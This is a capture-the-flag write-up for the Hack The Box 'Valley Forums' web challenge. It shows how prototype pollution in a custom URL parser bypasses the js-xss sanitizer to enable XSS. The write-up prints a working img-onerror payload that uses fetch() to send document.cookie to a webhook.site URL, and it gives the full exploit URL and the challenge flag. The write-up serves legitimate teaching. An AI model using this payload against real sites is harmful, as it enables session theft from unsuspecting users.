---
title: "Valley Forums — HTB Morocco Meetups Summer CTF Cup (Web Hard)"
published: 2026-09-06
description: "Writeup for the Valley Forums challenge from the Hack The Box Morocco Meetups Summer CTF Cup. Prototype pollution in a custom URL parser is used to bypass the js-xss sanitization library, enabling XSS to steal the bot's cookie."
image: ""
tags: [HackTheBox, CTF, Web, Hard, XSS, Prototype-Pollution, js-xss, JavaScript, Cookie-Theft]
category: Writeups
draft: false
---

## Challenge Info

| Field      | Value                                |
|------------|--------------------------------------|
| Event      | HTB Morocco Meetups Summer CTF Cup   |
| Category   | Web                                  |
| Difficulty | Hard                                 |
| Objective  | Steal the flag from the bot's cookie |

---

## Overview

**Valley Forums** is a hard web challenge that chains two client-side vulnerabilities: **Prototype Pollution** and **XSS**. The application uses the `js-xss` library to sanitize HTML before inserting it into the DOM, which normally prevents XSS. However, a custom URL query string parser is vulnerable to prototype pollution — an attacker can inject keys into `Object.prototype`, which pollutes the whitelist configuration used by `js-xss`, effectively bypassing the sanitizer and re-enabling XSS.

**Topics covered:**
- Prototype pollution via recursive object creation from URL parameters
- How `js-xss` uses a whitelist to filter HTML attributes
- Polluting `Object.prototype` to inject entries into the js-xss whitelist
- Chaining prototype pollution with XSS for cookie theft
- Headless browser bot exploitation

---

## Reconnaissance

Like the **Paid Forms** challenge, this application has a search field that reflects input onto the page. Testing immediately shows that **HTML injection** works:

![HTML injection test — markup is rendered](/assets/images/writeups/htb-ma-ctf/valley-forums/image-1.png)

However, attempting standard XSS payloads (e.g., `<img src=x onerror=alert(1)>`) fails — the payload is rendered but the `onerror` attribute is stripped. This tells us there is some form of HTML sanitization in place.

---

## Source Code Analysis

### The Sanitized Sink

In `static/js/forums.js`, the search functionality reads the `search` query parameter and passes it through a `sanitize()` function before inserting it into `innerHTML`:

```js
let params = parseParams(location.href);
if (params.hasOwnProperty('search')) {
    $('#search-res').style.display = 'block';
    $('#search-msg').innerHTML = `Search results for "${sanitize(params.search)}" :`;
    // todo: add search feature
}
```

The `sanitize()` function is provided by the **`js-xss`** library. It works by checking all HTML tags and attributes against a **whitelist** — anything not on the whitelist gets stripped. By default, `<img>` tags are allowed, but event handler attributes like `onerror` and `src` (with dangerous values) are not in the `<img>` whitelist, so they get removed.

### The Vulnerable URL Parser

The key to this challenge is in `static/js/parseParams.js`. The custom parser uses dot-notation in query keys to build nested objects recursively:

```js
if (!params[list[0]]) params[list[0]] = {};
```

This recursive `createElement` function splits a key like `a.b.c` by dots and builds `params.a.b.c`. The critical vulnerability is that it never checks if `list[0]` is `__proto__`. In JavaScript, assigning to `object.__proto__` doesn't create a property named `__proto__` — it **modifies the prototype of all objects**. This is **prototype pollution**.

### How js-xss Uses the Whitelist

The `js-xss` library's `sanitize()` function accepts an options object with a `whiteList` property. This is an object where keys are tag names and values are arrays of allowed attribute names. For example, the default whitelist might look like:

```js
{
  img: ['alt', 'title'],
  a: ['href', 'title'],
  // ...
}
```

When `sanitize()` checks whether `onerror` is allowed on an `<img>` tag, it looks up `options.whiteList.img` and checks if `onerror` is in that array. If the whitelist object for `img` is **inherited from `Object.prototype`** rather than defined directly, polluting `Object.prototype.whiteList.img` would affect every object that doesn't have its own `whiteList` property — including the one `js-xss` reads internally.

---

## Exploitation

### Strategy

1. Use the prototype pollution bug in `parseParams.js` to inject `src` and `onerror` into `Object.prototype.whiteList.img`.
2. This causes `js-xss` to allow `src` and `onerror` attributes on `<img>` tags.
3. Inject an `<img onerror>` XSS payload via the `search` parameter.
4. Submit the crafted URL to the bot so it visits the page, executes our JS, and sends its cookie to our webhook.

### Prototype Pollution Payload

By adding these keys to the URL query string, the custom parser will recursively traverse `__proto__ → whiteList → img` and assign our values:

```
__proto__.whiteList.img[0]=src&__proto__.whiteList.img[1]=onerror
```

This pollutes `Object.prototype` so that any object without its own `whiteList.img` property will now have `whiteList.img = ['src', 'onerror']`. The `js-xss` library reads the whitelist from an object that inherits from `Object.prototype`, so it now considers `src` and `onerror` as allowed attributes on `<img>` tags.

### XSS Payload

With the filter bypassed, we use the same cookie-stealing payload as in Paid Forms — an `<img>` with an `onerror` that fetches our webhook with `document.cookie`:

```html
<img src="data:image/png;base64,x" onerror="fetch('https://webhook.site/047da6b4-53a7-4f1e-bfdc-808372a2281e/'+encodeURIComponent(document.cookie))">
```

Note: `src="data:image/png;base64,x"` is used here instead of `src=x`. Both force the `onerror` to trigger (the base64 data is invalid), but `data:` URIs are less likely to be blocked by any additional URL-based filters.

### Full Payload URL

Combining both the XSS and the prototype pollution into a single URL submitted to the bot:

```
1?search=<img src="data:image/png;base64,x" onerror="fetch('https://webhook.site/047da6b4-53a7-4f1e-bfdc-808372a2281e/'+encodeURIComponent(document.cookie))">&__proto__.whiteList.img[0]=src&__proto__.whiteList.img[1]=onerror
```

The order matters here: `parseParams` processes **all** query parameters (including the prototype pollution keys) before the `search` value is sanitized, so the whitelist is already polluted by the time `sanitize()` runs.

### Execution

Sending the payload to the bot via Burp Suite:

![Burp Suite request sending the payload to the bot](/assets/images/writeups/htb-ma-ctf/valley-forums/image-2.png)

The bot visits the URL, the prototype pollution bypasses the sanitizer, the XSS fires, and our webhook receives a request with the flag cookie:

![Webhook receives the flag in the URL](/assets/images/writeups/htb-ma-ctf/valley-forums/image-3.png)

```
https://webhook.site/.../flag%3DHTB%7Bi7_b3c4m3_wh4t_1t_sw0r3_t0_d3str0y%7D
```

---

## Flag

```
HTB{i7_b3c4m3_wh4t_1t_sw0r3_t0_d3str0y}
```
